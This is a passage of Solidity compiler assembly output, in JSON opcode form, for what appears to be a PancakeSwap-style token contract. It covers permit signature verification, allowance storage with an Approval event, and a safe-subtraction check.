											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "DUP1"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "DUP3"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "ADD"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "SWAP1"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "SWAP3"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "SSTORE"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP3"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "MLOAD"
										},
										{
											"begin": 706,
											"end": 772,
											"name": "PUSH",
											"value": "6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP2"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP7"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "ADD"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "MSTORE"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP1"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP5"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "ADD"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "SWAP7"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "SWAP1"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "SWAP7"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "MSTORE"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "SWAP6"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP14"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "AND"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP7"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "ADD"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "MSTORE"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP6"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "ADD"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP13"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "SWAP1"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "MSTORE"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP6"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "ADD"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "SWAP6"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "SWAP1"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "SWAP6"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "MSTORE"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "PUSH",
											"value": "C0"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP1"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP6"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "ADD"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP12"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "SWAP1"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "MSTORE"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP2"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "MLOAD"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "DUP1"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "DUP7"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "SUB"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SWAP1"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SWAP2"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "ADD"
										},
										{
											"begin": 6,
											"end": 55,
											"name": "DUP2"
										},
										{
											"begin": 6,
											"end": 55,
											"name": "MSTORE"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP6"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "ADD"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "DUP3"
										},
										{
											"begin": 3901,
											"end": 4144,
											"name": "MSTORE"
										},
										{
											"begin": 3870,
											"end": 4162,
											"name": "DUP1"
										},
										{
											"begin": 3870,
											"end": 4162,
											"name": "MLOAD"
										},
										{
											"begin": 3870,
											"end": 4162,
											"name": "SWAP1"
										},
										{
											"begin": 3870,
											"end": 4162,
											"name": "DUP4"
										},
										{
											"begin": 3870,
											"end": 4162,
											"name": "ADD"
										},
										{
											"begin": 3870,
											"end": 4162,
											"name": "KECCAK256"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1901"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "F0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "DUP7"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "ADD"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "MSTORE"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "PUSH",
											"value": "102"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "DUP6"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "ADD"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "SWAP7"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "SWAP1"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "SWAP7"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "MSTORE"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "PUSH",
											"value": "122"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "DUP1"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "DUP6"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "ADD"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "SWAP7"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "SWAP1"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "SWAP7"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "MSTORE"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "DUP1"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "MLOAD"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "DUP1"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "DUP6"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "SUB"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SWAP1"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SWAP7"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "ADD"
										},
										{
											"begin": 6,
											"end": 55,
											"name": "DUP7"
										},
										{
											"begin": 6,
											"end": 55,
											"name": "MSTORE"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "PUSH",
											"value": "142"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "DUP5"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "ADD"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "DUP1"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "DUP3"
										},
										{
											"begin": 3774,
											"end": 4176,
											"name": "MSTORE"
										},
										{
											"begin": 3751,
											"end": 4186,
											"name": "DUP7"
										},
										{
											"begin": 3751,
											"end": 4186,
											"name": "MLOAD"
										},
										{
											"begin": 3751,
											"end": 4186,
											"name": "SWAP7"
										},
										{
											"begin": 3751,
											"end": 4186,
											"name": "DUP4"
										},
										{
											"begin": 3751,
											"end": 4186,
											"name": "ADD"
										},
										{
											"begin": 3751,
											"end": 4186,
											"name": "SWAP7"
										},
										{
											"begin": 3751,
											"end": 4186,
											"name": "SWAP1"
										},
										{
											"begin": 3751,
											"end": 4186,
											"name": "SWAP7"
										},
										{
											"begin": 3751,
											"end": 4186,
											"name": "KECCAK256"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP6"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP4"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP1"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "MSTORE"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "PUSH",
											"value": "162"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP5"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "ADD"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP1"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP3"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "MSTORE"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP7"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP1"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "MSTORE"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "PUSH",
											"value": "FF"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP10"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "AND"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "PUSH",
											"value": "182"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP6"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "ADD"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "MSTORE"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "PUSH",
											"value": "1A2"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP5"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "ADD"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP9"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP1"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "MSTORE"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "PUSH",
											"value": "1C2"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP5"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "ADD"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP8"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP1"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "MSTORE"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "MLOAD"
										},
										{
											"begin": 3734,
											"end": 3748,
											"name": "SWAP2"
										},
										{
											"begin": 3734,
											"end": 3748,
											"name": "SWAP4"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "SWAP3"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "PUSH",
											"value": "1E2"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP1"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP3"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "ADD"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "NOT"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP2"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "ADD"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP3"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "DUP2"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP1"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SUB"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP1"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP2"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "ADD"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP1"
										},
										{
											"begin": 4073,
											"end": 4088,
											"name": "DUP6"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "GAS"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "STATICCALL"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "77"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "77"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "NOT"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "ADD"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "MLOAD"
										},
										{
											"begin": 4223,
											"end": 4249,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 4280,
											"end": 4310,
											"name": "DUP2"
										},
										{
											"begin": 4280,
											"end": 4310,
											"name": "AND"
										},
										{
											"begin": 4280,
											"end": 4310,
											"name": "ISZERO"
										},
										{
											"begin": 4280,
											"end": 4310,
											"name": "DUP1"
										},
										{
											"begin": 4280,
											"end": 4310,
											"name": "ISZERO"
										},
										{
											"begin": 4280,
											"end": 4310,
											"name": "SWAP1"
										},
										{
											"begin": 4280,
											"end": 4339,
											"name": "PUSH [tag]",
											"value": "78"
										},
										{
											"begin": 4280,
											"end": 4339,
											"name": "JUMPI"
										},
										{
											"begin": 4280,
											"end": 4339,
											"name": "POP"
										},
										{
											"begin": 4334,
											"end": 4339,
											"name": "DUP9"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 4314,
											"end": 4339,
											"name": "AND"
										},
										{
											"begin": 4314,
											"end": 4330,
											"name": "DUP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 4314,
											"end": 4339,
											"name": "AND"
										},
										{
											"begin": 4314,
											"end": 4339,
											"name": "EQ"
										},
										{
											"begin": 4280,
											"end": 4339,
											"name": "tag",
											"value": "78"
										},
										{
											"begin": 4280,
											"end": 4339,
											"name": "JUMPDEST"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "PUSH [tag]",
											"value": "79"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "JUMPI"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "DUP1"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "DUP2"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "MSTORE"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "DUP3"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "ADD"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "MSTORE"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "PUSH",
											"value": "1A"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "DUP3"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "ADD"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "MSTORE"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "PUSH",
											"value": "50616E63616B653A20494E56414C49445F5349474E4154555245000000000000"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "DUP3"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "ADD"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "MSTORE"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "SWAP1"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "MLOAD"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "SWAP1"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "DUP2"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "SWAP1"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "SUB"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "ADD"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "SWAP1"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "REVERT"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "tag",
											"value": "79"
										},
										{
											"begin": 4259,
											"end": 4391,
											"name": "JUMPDEST"
										},
										{
											"begin": 4401,
											"end": 4432,
											"name": "PUSH [tag]",
											"value": "80"
										},
										{
											"begin": 4410,
											"end": 4415,
											"name": "DUP10"
										},
										{
											"begin": 4417,
											"end": 4424,
											"name": "DUP10"
										},
										{
											"begin": 4426,
											"end": 4431,
											"name": "DUP10"
										},
										{
											"begin": 4401,
											"end": 4409,
											"name": "PUSH [tag]",
											"value": "66"
										},
										{
											"begin": 4401,
											"end": 4432,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 4401,
											"end": 4432,
											"name": "tag",
											"value": "80"
										},
										{
											"begin": 4401,
											"end": 4432,
											"name": "JUMPDEST"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "POP"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "POP"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "POP"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "POP"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "POP"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "POP"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "POP"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "POP"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "POP"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "tag",
											"value": "63"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "JUMPDEST"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "SWAP1"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "DUP2"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "MSTORE"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "SWAP3"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "DUP4"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "MSTORE"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "DUP1"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "DUP5"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "KECCAK256"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "SWAP1"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "SWAP2"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "MSTORE"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "SWAP1"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "DUP3"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "MSTORE"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "SWAP1"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "KECCAK256"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "SLOAD"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "DUP2"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 2410,
											"end": 2579,
											"name": "tag",
											"value": "66"
										},
										{
											"begin": 2410,
											"end": 2579,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "DUP1"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "DUP5"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "AND"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "DUP2"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "DUP2"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "MSTORE"
										},
										{
											"begin": 2493,
											"end": 2502,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "SWAP1"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "DUP2"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "MSTORE"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "DUP1"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "DUP4"
										},
										{
											"begin": 2493,
											"end": 2509,
											"name": "KECCAK256"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "SWAP5"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "DUP8"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "AND"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "DUP1"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "DUP5"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "MSTORE"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "SWAP5"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "DUP3"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "MSTORE"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "SWAP2"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "DUP3"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "SWAP1"
										},
										{
											"begin": 2493,
											"end": 2518,
											"name": "KECCAK256"
										},
										{
											"begin": 2493,
											"end": 2526,
											"name": "DUP6"
										},
										{
											"begin": 2493,
											"end": 2526,
											"name": "SWAP1"
										},
										{
											"begin": 2493,
											"end": 2526,
											"name": "SSTORE"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "DUP2"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "MLOAD"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "DUP6"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "DUP2"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "MSTORE"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "SWAP2"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "MLOAD"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "PUSH",
											"value": "8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "SWAP3"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "DUP2"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "SWAP1"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "SUB"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "SWAP1"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "SWAP2"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "ADD"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "SWAP1"
										},
										{
											"begin": 2541,
											"end": 2572,
											"name": "LOG3"
										},
										{
											"begin": 2410,
											"end": 2579,
											"name": "POP"
										},
										{
											"begin": 2410,
											"end": 2579,
											"name": "POP"
										},
										{
											"begin": 2410,
											"end": 2579,
											"name": "POP"
										},
										{
											"begin": 2410,
											"end": 2579,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 339,
											"end": 475,
											"name": "tag",
											"value": "70"
										},
										{
											"begin": 339,
											"end": 475,
											"name": "JUMPDEST"
										},
										{
											"begin": 431,
											"end": 436,
											"name": "DUP1"
										},
										{
											"begin": 431,
											"end": 436,
											"name": "DUP3"
										},
										{
											"begin": 431,
											"end": 436,
											"name": "SUB"
										},
										{
											"begin": 426,
											"end": 442,
											"name": "DUP3"
										},
										{
											"begin": 426,
											"end": 442,
											"name": "DUP2"
										},
										{
											"begin": 426,
											"end": 442,
											"name": "GT"
										},
										{
											"begin": 426,
											"end": 442,
											"name": "ISZERO"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH [tag]",
											"value": "64"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "JUMPI"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "DUP1"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "DUP2"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "MSTORE"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "DUP3"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "ADD"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "MSTORE"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "15"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "DUP3"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "ADD"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
